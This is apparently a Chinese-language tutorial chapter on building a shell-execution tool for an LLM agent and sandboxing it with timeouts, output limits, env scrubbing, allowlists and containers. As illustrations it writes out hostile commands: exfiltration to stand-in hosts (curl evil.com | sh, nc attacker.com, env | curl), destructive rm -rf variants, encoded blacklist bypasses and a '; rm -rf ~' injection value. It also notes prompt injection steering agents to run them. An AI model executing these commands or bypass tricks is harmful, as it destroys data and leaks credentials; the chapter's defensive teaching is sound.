# Ch 22 — 執行 shell 與沙箱

> **目標**：給 agent 一個「執行命令」的能力，並用沙箱把這個能力的破壞力關起來。讀完你能說出為什麼 shell 工具是 agent 工具箱裡**最危險**的一個、為什麼「檢查命令字串安不安全」這條路從根本上走不通、防禦要靠哪些**分層**（逾時、輸出上限、檔案系統與網路隔離、權限降級、容器/VM），以及 `shell=True` 的命令注入陷阱怎麼避開。

> **環境**：Python 3.11、`subprocess`。**沙箱機制高度依賴作業系統**：本章的程序層控制（逾時、輸出上限、cwd）跨平台通用；但真正的隔離（容器、seccomp、namespace）以 Linux 為主，Windows/macOS 的對應方案會分開標注。範例本身在 Python 3.11 可跑，但「真正的隔離」那節需要 Docker 等外部環境。

## 為什麼需要這個？也為什麼它最危險

一個寫程式的 agent，光會讀寫檔案（Ch 21）還不夠。它得**跑東西**：執行測試看綠不綠、編譯、跑 linter、`git commit`、`pip install`、啟動 dev server。這些都是 shell 命令。給 agent 一個「執行 shell」的工具，它的能力會大幅躍升——從「能改檔」變成「能驗證自己改得對不對、能完成端到端的開發循環」。

但這也是**整個工具箱裡最危險的一步**。為什麼？因為 Ch 21 的檔案工具，無論多危險，動作空間是**有界**的——就是讀/寫/列/改檔。而一個 shell 工具的動作空間是**無界**的：`rm -rf /`、`curl evil.com | sh`、`cat ~/.ssh/id_rsa | nc attacker.com 1234`、挖礦、當跳板攻擊內網……**「執行任意 shell 命令」在定義上就等於「任意程式碼執行」（arbitrary code execution）**。你給的不是一個工具，是整台機器。

```
   工具的「破壞力半徑」
   read_file    ▏ 唯讀、夾在 workspace 內         （Ch 21）
   write_file   ▏▏ 改檔，夾在 workspace 內         （Ch 21）
   run_shell    ▏▏▏▏▏▏▏▏▏▏▏▏▏▏▏▏▏▏ 整台機器能做的任何事  ← 本章
```

所以本章的重點不是「怎麼跑命令」（那是 `subprocess` 一行的事），而是**「怎麼在給出這個能力的同時，把破壞力關進一個盒子裡」**。

## 先建立直覺：不是「檢查命令」，是「限制環境」

新手的第一直覺是：「那我檢查命令字串，危險的就擋掉。」——**這條路從根本上走不通**，這是本章最重要的觀念，先建立它。

想像你想靠「讀命令文字、判斷它危不危險」來防護。你封了 `rm`。但攻擊面是無窮的：

```
   rm -rf /          ← 你封了 rm
   python -c "import shutil; shutil.rmtree('/')"   ← 用 python 刪
   find / -delete    ← 用 find 刪
   echo cm0gLXJmIC8= | base64 -d | sh             ← 編碼繞過
   $(printf '\x72\x6d') -rf /                       ← 組裝出 rm
```

你永遠封不完。**「黑名單一段圖靈完備語言的危險子集」是不可能的任務**——因為一個能跑任意命令的環境，本來就能用無數種方式表達同一個危險動作。這跟 Ch 21 的路徑黑名單（`if "../" in path`）擋不住一樣，只是更極端。

正確的心智模型是**換一個問題**：不要問「這個命令危不危險」，要問「**就算它想搞破壞，它能搞到的範圍有多大**」。你不是在審查命令，你是在**設計它執行的環境**——讓那個環境裡，破壞性的命令**無處施展**：

```
   ❌ 守門員思路：檢查每個命令放不放行（防不住）
   ✅ 牢房思路：假設命令可能是惡意的，把執行環境關到「就算惡意也傷不了你」
      ├── 跑多久就砍掉（逾時）
      ├── 輸出多大就截斷（不讓垃圾塞爆 context；記憶體/磁碟耗盡要另靠隔離）
      ├── 只能看到 workspace（檔案系統隔離）
      ├── 連不出網路（網路隔離）
      ├── 用低權限帳號跑（權限降級）
      └── 整個關進容器/VM（真正的邊界）
```

這就是 Ch 21 結尾埋的伏筆——應用層的路徑檢查擋不住 TOCTOU，真正的邊界要靠 **OS 層的隔離**。本章就是在講那層。

## 一、最危險的反例：天真的 shell 工具

先看一個**千萬別上線**的版本，逐條診斷它的問題：

```python
import subprocess

# 反例！這是一個遠端任意程式碼執行漏洞，不是工具
def run_shell(command: str) -> str:
    result = subprocess.run(command, shell=True, capture_output=True, text=True)  # 💥
    return result.stdout + result.stderr
```

它的問題層層疊疊：

1. **`shell=True` + 字串命令 = 命令注入溫床**（見第二節）。
2. **沒有逾時**：模型跑一個 `sleep 1000` 或無窮迴圈，你的 agent 直接卡死。
3. **沒有輸出上限**：一個 `cat huge.log` 或 `yes` 能回傳 GB 級輸出，撐爆 context（Ch 16）。（注意：`capture_output=True` 會先把輸出全收進**記憶體**才輪到你截斷，所以要擋住記憶體被撐爆是另一回事——見第三節。）
4. **沒有 cwd 限制**：在哪跑？預設在 agent 的工作目錄，能 `cd /` 到處跑。
5. **沒有任何隔離**：以 agent 程序的完整權限跑——能讀你的 SSH key、能連網、能刪檔。
6. **沒有 exit code**：只把 stdout/stderr 黏一起，模型不知道命令成功還失敗（Ch 20 的結果設計全沒做）。

這六點，下面分兩組解決：**程序層控制**（二～四節，跨平台、應用層能做）和**真正的隔離**（五節，靠 OS）。

## 二、`shell=True` vs `shell=False`：命令注入

先解第一個、也最常被忽略的問題。`subprocess` 有兩種傳命令的方式，安全性天差地別：

```python
# ❌ shell=True + 字串：經過 shell 解析，特殊字元（; | $ ` && > ）會被詮釋
subprocess.run(f"ls {user_input}", shell=True)
#   若 user_input = "; rm -rf ~"  → 實際執行 "ls ; rm -rf ~" → 災難

# ✅ shell=False（預設）+ 參數列表：直接 exec，不經 shell，特殊字元只是字面字串
subprocess.run(["ls", user_input])
#   若 user_input = "; rm -rf ~"  → ls 去找一個叫 "; rm -rf ~" 的檔案，找不到而已
```

差別的本質：`shell=True` 會把字串丟給 shell 解析（POSIX 上是 `/bin/sh -c`，Windows 上是 `cmd.exe`/`COMSPEC`，元字元語法不同但風險一樣存在），於是 `;`、`|`、`$()`、`` ` ``、`&&` 這些 shell 元字元**會被當成語法**，攻擊者（或被注入的模型輸出）能藉此把一個命令變成多個。`shell=False` + 參數列表則是直接交給 OS 啟動程序（POSIX `exec`、Windows `CreateProcess`），那些字元只是傳給程式的字面參數，沒有「第二個命令」的空間。

**鐵則：能用參數列表（`shell=False`）就絕不用 `shell=True`。**

這裡有個張力：agent 常常**想要** shell 的功能——管線 `|`、重導向 `>`、`&&` 串接、glob `*`。如果你的 agent 真的需要這些，有兩條路：

- **明確要求模型提供「參數列表」而非「命令字串」**（schema 設計，Ch 18）。工具收到 `["pytest", "-k", "test_foo"]`，沒有 shell 解析的空間。代價是模型用不了管線/重導向。
- **若真要支援完整 shell**，那就**接受「這等於任意程式碼執行」這個前提**，把賭注全押在第五節的 OS 隔離上——因為此時你**不可能**靠檢查命令字串獲得安全。Claude Code 的 `Bash` 工具走的是這條：給完整 shell，但配合權限確認（Ch 25）與沙箱。

換句話說，`shell=False` 的參數列表能擋掉「注入」，但擋不掉「模型本來就想跑的那個危險命令」——後者只能靠隔離。想清楚你的 agent 到底需不需要完整 shell，別預設就開 `shell=True`。

## 三、程序層控制：逾時與輸出上限

無論有沒有 OS 隔離，這兩個控制都該有，因為它們防的是「失控」而不只是「惡意」——一個善意但寫錯的命令（無窮迴圈、誤印巨量 log）一樣會搞垮你的 agent。

```python
import subprocess

MAX_OUTPUT_CHARS = 8000     # 輸出上限（字元預算，非精確 token，見 Ch 16）

def run_command(args: list[str], cwd: str, timeout: int = 30) -> "ToolResult":  # ToolResult 見 Ch 20
    try:
        proc = subprocess.run(
            args,                       # 參數列表，shell=False（預設）
            cwd=cwd,                    # 在 workspace 內跑（見第四節）
            capture_output=True,
            text=True,
            timeout=timeout,            # ← 逾時：超過就丟 TimeoutExpired
        )
    except subprocess.TimeoutExpired:
        return ToolResult(
            content=f"命令逾時（超過 {timeout} 秒）已中止。若需更久，請拆小或說明原因。",
            is_error=True)
    except FileNotFoundError:
        return ToolResult(content=f"找不到命令 '{args[0]}'。請確認它已安裝。", is_error=True)

    # 把 stdout / stderr / exit code 都結構化回給模型（Ch 20）
    out = proc.stdout or ""
    err = proc.stderr or ""
    body = f"exit code: {proc.returncode}\n"
    if out:
        body += f"--- stdout ---\n{_clip(out)}\n"
    if err:
        body += f"--- stderr ---\n{_clip(err)}\n"
    # exit code != 0 標成 is_error，讓模型知道命令失敗（但這是「執行完成、結果失敗」，仍有輸出可看）
    return ToolResult(content=body, is_error=(proc.returncode != 0))

def _clip(text: str) -> str:
    if len(text) <= MAX_OUTPUT_CHARS:
        return text
    half = MAX_OUTPUT_CHARS // 2
    # 命令輸出的「頭」和「尾」通常都重要（頭是上下文、尾是錯誤/結論），所以兩頭都留
    return f"{text[:half]}\n…（輸出過長已截斷，中間省略）…\n{text[-half:]}"
```

幾個設計決策值得講：

- **逾時一定要有**，且 `subprocess` 的 `timeout` 在逾時後會殺掉**直接**子程序、再丟 `TimeoutExpired`。兩個細節：(1) 它套在「等輸出 / `communicate`」這個階段，不保證在 process 建立的瞬間就能中斷；(2) 若子程序又開了孫程序（例如 shell 啟動的背景程序），預設不一定全殺乾淨——需要用 process group（`start_new_session=True` + `os.killpg`）整組殺，這是進階（見下節）。還有：逾時**不等於輸出上限**——`yes` 這種命令在 30 秒內就能吐出海量資料。
- **`_clip()` 只保護「模型 context」，不保護「你的記憶體」**：這是個重要區別。`capture_output=True` 會把 stdout/stderr **完整收進記憶體**才回傳，`_clip()` 是在那之後才截斷——所以一個 `yes` 或 `cat 10GB.bin` 仍可能在你截斷它之前就把 RAM 吃光。要真正擋住記憶體被撐爆，得換做法：用 `Popen` 串流讀取、讀到上限就主動 kill；或寫進一個有大小上限的暫存檔；或乾脆把整件事交給第五節的容器 `--memory` / `rlimit` 從外面限死。`_clip()` 防的是「別把垃圾塞進 context」，不是「別把記憶體吃光」。
- **輸出截斷留頭也留尾**：和 Ch 16 純截尾不同——命令輸出的錯誤訊息常在**最後**（traceback、`FAILED` 摘要），但開頭也常有重要上下文，所以兩頭都保留、砍中間。
- **exit code 是關鍵訊號**：Ch 20 講過結果要自我解釋。`exit code: 1` + stderr 讓模型知道「命令失敗了、為什麼」，能據此修正。把 `returncode != 0` 標 `is_error` 是合理的——但注意這是「命令執行完成、但結果是失敗」，content 裡仍要附完整輸出讓模型診斷。

## 四、檔案系統與環境隔離（應用層能做的部分）

程序控制管「失控」，隔離管「惡意能波及多遠」。應用層（不靠容器）能做的第一層隔離：

```python
import os

def run_command(args, workspace, timeout=30):
    # ① cwd 鎖在 workspace（呼應 Ch 21 的牢房）
    # ② 清掉敏感環境變數，只傳一個最小、乾淨的 env（白名單，按平台補必要變數）
    clean_env = {
        "PATH": "/usr/bin:/bin",        # 最小 PATH，別把整個使用者環境帶進去
        "HOME": workspace,              # HOME 指到 workspace，降低工具預設去讀 ~/.ssh、~/.aws 的機率
        "LANG": "en_US.UTF-8",
        # 實務上常還要按平台/工具鏈補：LC_ALL、TMPDIR/TEMP/TMP、
        # Windows 幾乎必備 SYSTEMROOT，否則很多程式起不來。
        # 原則是「最小白名單，缺什麼補什麼」，而不是直接複製 os.environ。
    }
    # 絕不要原樣傳 os.environ —— 那裡有 API key、token、AWS 憑證等
    proc = subprocess.run(args, cwd=workspace, env=clean_env,
                          capture_output=True, text=True, timeout=timeout)
    ...
```

兩個重點：

- **cwd 鎖 workspace**：命令預設在 workspace 內跑。但**注意這只是「起點」**——`cwd` 不阻止命令用絕對路徑 `cat /etc/passwd` 或 `cd /`。要真正限制檔案系統可見範圍，得靠第五節的 OS 隔離（mount namespace / 容器）。`cwd` 是方便，不是邊界。
- **scrub 環境變數**：這條最常被漏。如果你原樣把 `os.environ` 傳給子程序，那麼你 agent 程序裡的 `ANTHROPIC_API_KEY`、`AWS_SECRET_ACCESS_KEY`、各種 token 全都被子命令看得到——一個 `env | curl -d @- evil.com` 就洩光了。**只傳一個最小、白名單的 env**。注意 `HOME=workspace` 只是降低工具「預設」去讀 `~/.ssh` 的機率，**不是安全邊界**——命令照樣能用絕對路徑 `cat /home/you/.ssh/id_rsa`。要真正擋住，仍得靠下一節的檔案系統隔離。

再次強調：cwd + env scrub 提高了門檻，但**擋不住一個決心搞破壞的命令**（它能用絕對路徑、能嘗試各種 syscall）。要真正的邊界，往下看。

## 五、真正的隔離：把命令關進容器/VM

前面所有應用層手段，都在「同一個作業系統、同一個核心、同一個使用者」裡跑命令——這意味著一個夠狠的命令仍可能：用絕對路徑亂跑、耗盡記憶體/CPU、利用 kernel 漏洞提權、連網外洩。要堵住這些，唯一可靠的是**把命令的執行環境，從你的主系統隔離出去**。由弱到強：

- **權限降級（least privilege）**：用一個**沒有任何重要權限的專用帳號**跑子程序（Linux 的 `setuid` 到 nobody、或 `subprocess` 的 `user=` 參數，Python 3.9+）。這**降低被攻破後的權限**——身分本身動不了重要東西。但要分清楚：它不能「防提權」，若 kernel 有 local privilege escalation 漏洞，低權限程序仍可能被用來提權。這是最低成本的一層，配合其他層用。
- **資源限制（resource limits）**：Linux 的 `resource.setrlimit`（`RLIMIT_AS` 記憶體、`RLIMIT_CPU` CPU 時間、`RLIMIT_NOFILE` 開檔數、`RLIMIT_NPROC` 程序數），能**輔助**擋挖礦、fork bomb、吃光記憶體。`subprocess` 可用 `preexec_fn` 在子程序 exec 前設好。但這是**輔助限制、不是完整資源隔離**：wall-clock 時間、磁碟 I/O、網路頻寬它管不到，`RLIMIT_AS` 在某些 runtime 下行為也不直覺；完整的資源隔離要靠 cgroup / 容器。
- **容器（container）**：把命令跑在 Docker/Podman 容器裡，配上：唯讀根檔案系統、只掛載 workspace（`-v`）、`--network none` 斷網、`--memory`/`--cpus` 限資源、`--user` 非 root、丟掉 capabilities（`--cap-drop ALL`）、seccomp 過濾 syscall。這是目前**最常見的生產做法**——隔離夠強、開銷可接受。
- **gVisor / microVM（如 Firecracker）**：容器共用主機 kernel，仍有 kernel 漏洞提權的風險。gVisor 用使用者態 kernel 攔截 syscall、Firecracker 用輕量 VM——**顯著縮小 kernel/host 攻擊面**，代價是更複雜、稍慢。處理**完全不可信**的程式碼（例如跑網路上隨機抓來的東西）時值得。
- **完整 VM**：最強隔離、最大開銷。極高風險場景才需要。

  即使到 gVisor/VM 這一層，也**不是「絕對安全」**——逃逸漏洞、配置錯誤、共享掛載、把憑證注進去、side channel、與 host 的整合點，都還是風險。隔離強度是一條光譜，往右移是「攻擊面越來越小、成本越來越高」，不是「某一層之後就刀槍不入」。

> **認識論誠實（平台）**：上面以 Linux 為主。**macOS** 有 `sandbox-exec`（已 deprecated 但仍用）與 App Sandbox；**Windows** 沒有 Linux 那套 namespace，對應方案是 Job Objects（限資源）、AppContainer/受限 token（降權限）、或乾脆跑在 WSL2/Hyper-V/Docker Desktop 裡。**跨平台 agent 的常見解法就是「一律在容器裡跑」**，把平台差異交給容器處理。別假設你在 Linux 寫的 `setrlimit`/`user=` 在 Windows 有對應行為。

> **這就是 Claude Code 的做法**：Claude Code 的 `Bash` 工具給的是**完整 shell**（不做命令字串黑名單，因為前面講了那不可能），安全靠兩層：(1) **權限確認**——危險命令要使用者按下同意（Ch 25）；(2) **sandbox** 選項——把命令關進受限環境。理解本章，你就懂它為什麼那樣設計。

## 六、allowlist：另一條（受限但可控）的路

如果你的 agent **不需要**完整 shell，只需要跑幾種固定命令（例如「只能跑 pytest 和 git」），那有一條比「完整 shell + 重隔離」簡單得多的路：**白名單**。

```python
# 名單裡刻意「只放動作空間有限的命令」——注意 python / bash / sh 絕不能進來（見下）
ALLOWED = {"pytest", "git", "ls"}

def run_command(args, workspace, timeout=30):
    if not args or args[0] not in ALLOWED:
        return ToolResult(
            content=f"不允許執行 '{args[0] if args else ''}'。可用命令：{sorted(ALLOWED)}",
            is_error=True)
    # ... 過了白名單再跑（仍要 shell=False + 逾時 + 輸出上限 + env scrub）
```

白名單 vs 黑名單的根本差異（呼應第一節）：**黑名單要枚舉所有壞的（不可能）；白名單只允許明確列出的好的（可行）**。白名單把「無界的動作空間」縮成「有界的幾個命令」，安全性立刻可控。

但白名單有真實的限制，要誠實面對：

- **`args[0]` 是命令名，但參數仍可能危險**：`git` 在白名單，但 `git config --global core.pager "rm -rf ~"` 之類仍可能搞事；`cat` 看似無害，但沒有檔案系統隔離時 `cat /etc/passwd`、`cat ~/.ssh/id_rsa` 照樣讀得到敏感檔。而 `python`/`bash`/`sh` 一旦進名單就**等於開了任意程式碼執行的後門**（`python -c "..."` 想幹嘛就幹嘛），白名單瞬間失去意義。所以白名單**不能只看命令名**：是否放行要連「這個命令的參數能做到什麼」一起想，會脫離有界動作空間的命令（`python`、`bash`、`find -exec`）一律別放。
- **彈性差**：agent 一旦需要名單外的命令就卡住，可能反覆撞牆。

實務取捨：**動作空間小且固定 → 白名單**（簡單可控）；**需要完整開發能力 → 完整 shell + 容器隔離 + 權限確認**。別想用白名單去近似完整 shell，那會變成一個擋不完又綁手綁腳的四不像。

## 對比與取捨

| 手段 | 防什麼 | 擋不住什麼 | 成本 |
|---|---|---|---|
| `shell=False` 參數列表 | 命令注入（`;` `|` `$()`） | 模型本來就想跑的危險命令 | 零（但失去管線/重導向） |
| 逾時 | 卡死、無窮迴圈 | 快速的破壞（瞬間 `rm`） | 零 |
| 輸出上限（`_clip`） | 垃圾塞爆 context | 記憶體/磁碟耗盡（要靠串流或容器限制） | 零 |
| cwd + env scrub | 順手亂跑、洩漏 token | 絕對路徑存取、syscall 層攻擊 | 低 |
| 權限降級 + rlimit | 降低被攻破後的權限、輔助擋挖礦/fork bomb | kernel 提權漏洞、wall-clock/I/O/網路耗用 | 低（Linux） |
| 容器 | 檔案系統/網路/資源隔離 | kernel 0-day 提權、掛載/配置失誤 | 中 |
| gVisor / VM | 連 kernel 攻擊面都大幅縮小 | 逃逸漏洞、配置錯誤、共享掛載、憑證注入 | 高 |
| 白名單 | 把動作空間縮到有界 | 名單內命令的危險參數 | 低（但綁手綁腳） |

沒有單一手段足夠——**縱深防禦（defense in depth）**：多層疊加，每層擋一類，破一層還有下一層。

## 踩雷集錦

1. **想靠「檢查命令字串」獲得安全**：黑名單一段圖靈完備語言的危險子集是不可能的。不要審查命令，要限制環境。這是全章第一觀念。
2. **`shell=True` 配字串命令**：命令注入的經典溫床。能用 `shell=False` 參數列表就絕不用 `shell=True`。
3. **沒有逾時**：一個 `sleep`/無窮迴圈就讓 agent 卡死。逾時是底線，且要確保連子孫程序一起殺（process group）。
4. **原樣傳 `os.environ` 給子程序**：你的 API key、雲端憑證全都洩給子命令。只傳最小白名單 env。
5. **把 `cwd` 當成檔案系統邊界**：`cwd` 只是起點，命令能用絕對路徑跑出去。真正的檔案系統隔離要靠容器/namespace。
6. **以為「跑在我的機器上但小心點」就夠**：同 kernel、完整權限下，沒有真正安全可言。處理不可信命令要容器化甚至 VM。
7. **白名單只檢查命令名**：`python`、`bash`、`sh` 在白名單等於沒白名單；`git`/`find` 的某些參數也危險。白名單要連「危險參數」一起想。

## 進階：再往深一層

- **process group 與徹底清理**：`subprocess` 的 `timeout` 殺的是直接子程序。若那個子程序 fork 了背景程序（`some_server &`），它們可能變孤兒繼續跑。生產做法要從 `subprocess.run` 換成 `subprocess.Popen(args, start_new_session=True, ...)`（讓子程序成為新 process group 的 leader），自己用 `proc.communicate(timeout=...)`，捕捉到 `TimeoutExpired` 時 `os.killpg(os.getpgid(proc.pid), signal.SIGKILL)` 整組殺、再 `communicate()` 收屍——因為 `run` 的 timeout 路徑不方便插進 `killpg`。Windows 上對應是 Job Object（把程序綁進 job，殺 job 連同所有子程序），但 Python 標準庫沒有直接的 Job Object API，要靠 `pywin32`/`ctypes` 或現成 wrapper。
- **串流輸出 vs 一次收集**：`capture_output=True` 是等命令跑完才拿到全部輸出。長命令（跑很久的測試）你可能想**邊跑邊串流**給使用者看進度（Ch 31 背景任務）。串流要自己讀 `proc.stdout` 的 pipe，並小心 pipe 緩衝塞滿會 deadlock（命令寫滿 pipe、你還沒讀，它就卡住）——這也是為什麼一次性 `capture_output` 對短命令更省事。
- **互動式命令的處理**：`apt install`（問 y/n）、`vim`、`ssh`（問密碼）這類會等 stdin 的命令，在自動化環境會卡死等輸入。對策：給 stdin 餵 `/dev/null` 或空輸入、用命令的非互動旗標（`apt -y`、`git --no-pager`）、或在工具描述（Ch 19）告訴模型別跑互動式命令。
- **沙箱逃逸是一個持續的軍備競賽**：容器不是完美邊界——共用 kernel、掛載配置失誤、capabilities 沒丟乾淨都可能被逃逸。安全是「提高成本」不是「絕對」。對高風險場景，分層越多越好，並假設每一層都可能被破。
- **與 prompt injection 的合流**：最可怕的情境是「網頁/檔案裡藏的惡意指令說服模型去跑惡意 shell」——shell 工具讓 prompt injection（Ch 36）從「胡說八道」升級成「真的執行攻擊」。要分清楚：沙箱**限制後果**，但**不能取代決策層的 prompt injection 防護**——模型仍可能去做「沙箱內允許、但業務上不該做」的事（刪掉整個 workspace、提交一個惡意 patch、把不在環境變數裡的敏感資料外洩）。這是為什麼有 shell 能力的 agent，prompt injection 防護和沙箱**兩者都要**，缺一不可。

## 動手練習

1. 把第一節那個天真的 `run_shell` 換成第三節的 `run_command`（參數列表、逾時、輸出上限、exit code）。測試：跑 `sleep 100`（驗證逾時砍掉）、跑一個印巨量輸出的命令（驗證截斷留頭尾）、跑一個會 exit 1 的命令（驗證 `is_error` 與 stderr 都回來了）。
2. **重現命令注入**：寫一個 `shell=True` 的 `run("ls " + user_input)`，傳 `user_input="; echo PWNED"`，看到第二個命令被執行。改成 `shell=False` 參數列表，看注入失效。
3. **驗證 env 洩漏**：在 `os.environ` 放一個假的 `FAKE_SECRET`，先原樣傳 env 跑 `env | grep FAKE`（看到洩漏），再改成最小 clean_env 跑（看不到）。
4. 實作白名單 `run_command`，只允許 `git` 和 `ls`。跑一個名單外命令確認被擋；再思考「`git` 的哪些參數其實危險」，列出三個。
5. （進階，需 Docker）把 `run_command` 改成「在容器裡跑」，用接近 sandbox 的旗標：`docker run --rm --network none --read-only --cap-drop ALL --security-opt no-new-privileges --user 1000:1000 -v workspace:/ws -w /ws --memory 256m alpine sh -c ...`（非 root 跑、workspace 是唯一可寫區、根檔案系統唯讀）。比較有無 `--network none` 時命令能不能 `curl` 出去；再試拿掉 `--memory` 跑一個吃記憶體的命令，看容器層的限制怎麼把它擋下來（對照第三節「`_clip` 防不了記憶體」）。

## 本章重點整理

- shell 工具 = 任意程式碼執行，是工具箱裡最危險的一個；它的動作空間無界。
- **第一觀念**：不要「檢查命令安不安全」（黑名單圖靈完備語言不可能），要「限制執行環境讓破壞無處施展」。
- `shell=False` 參數列表擋命令注入；但擋不住模型本來就想跑的危險命令——那要靠隔離。
- 程序層控制（逾時、輸出上限留頭尾、exit code、env scrub）人人都該做，防「失控」也防順手破壞。
- 真正的邊界靠 OS 隔離：權限降級 → rlimit → 容器（最常見）→ gVisor/VM。縱深防禦，多層疊加。
- 動作空間小用白名單（有界、可控）；要完整 shell 就接受「任意程式碼執行」前提、押注在容器隔離 + 權限確認（Ch 25）。

## 自我檢核

- [ ] 我能向別人解釋「為什麼檢查命令字串無法獲得安全」，並舉出至少三種繞過黑名單的方式
- [ ] 不看本章，我能說出 `shell=True` 配字串命令的具體風險，以及 `shell=False` 為什麼能擋注入
- [ ] 我能列出程序層控制的四項（逾時/輸出上限/exit code/env scrub），並說明各防什麼
- [ ] 面試被問「怎麼安全地讓 agent 跑 shell」，我能講出縱深防禦的分層
- [ ] 我知道 `cwd` 和 white-list 各自的限制在哪，不會把它們當成完整的安全邊界
- [ ] 我能說出為什麼有 shell 能力的 agent，prompt injection 防護變得格外重要

## 延伸閱讀

### 官方文件

- **[Python — `subprocess`（Security Considerations）](https://docs.python.org/3/library/subprocess.html#security-considerations)**
  - **讀哪裡**：Security Considerations 那節，以及 `shell=True` 的警告、`timeout`、`user`/`group`/`preexec_fn` 參數說明。
  - **能學到什麼**：本章二～四節每個 API 的權威語意——尤其官方對 `shell=True` 注入風險的明確警告。
  - **前提知識**：懂基本 `subprocess.run` 即可。

- **[Docker — Run the Docker daemon as a non-root user / security](https://docs.docker.com/engine/security/)**
  - **讀哪裡**：security 概覽、`--cap-drop`、seccomp、`--network none`、唯讀掛載的部分。
  - **能學到什麼**：第五節「用容器隔離」的具體配置——本章列的那些旗標，這裡有完整說明。
  - **前提知識**：懂容器基本概念。

### 部落格 / 技術文章

- **[OWASP — OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)** — OWASP
  - **這篇說什麼**：命令注入的攻擊與防禦——為什麼參數化（參數列表）勝過字串拼接、為什麼黑名單不可靠。
  - **讀哪裡**：Defense 那幾節，特別是「不要用 shell、用參數陣列」的建議。
  - **為什麼值得讀**：本章第一、二節觀點的權威來源；把「黑名單不可行、要限制環境」這個直覺講得很清楚。

- **[gVisor — What is gVisor?](https://gvisor.dev/docs/)** — Google
  - **這篇說什麼**：為什麼容器共用 kernel 仍有風險，gVisor 怎麼用使用者態 kernel 縮小攻擊面。
  - **讀哪裡**：overview 與 architecture 的「為什麼需要它」段落。
  - **為什麼值得讀**：第五節「容器擋不住 kernel 0-day」的延伸——理解隔離強度的光譜，這是執行不可信程式碼的前沿方案。

下一章我們換個方向：當工具越來越多（這幾章你已經做了檔案、shell 一堆工具），全部塞進每次請求會稀釋模型注意力又撐大快取前綴。下一章談怎麼讓工具「按需出現」——tool search 與 deferred tools。

→ [Ch 23 Tool search / deferred tools](./23-tool-search-deferred.md)
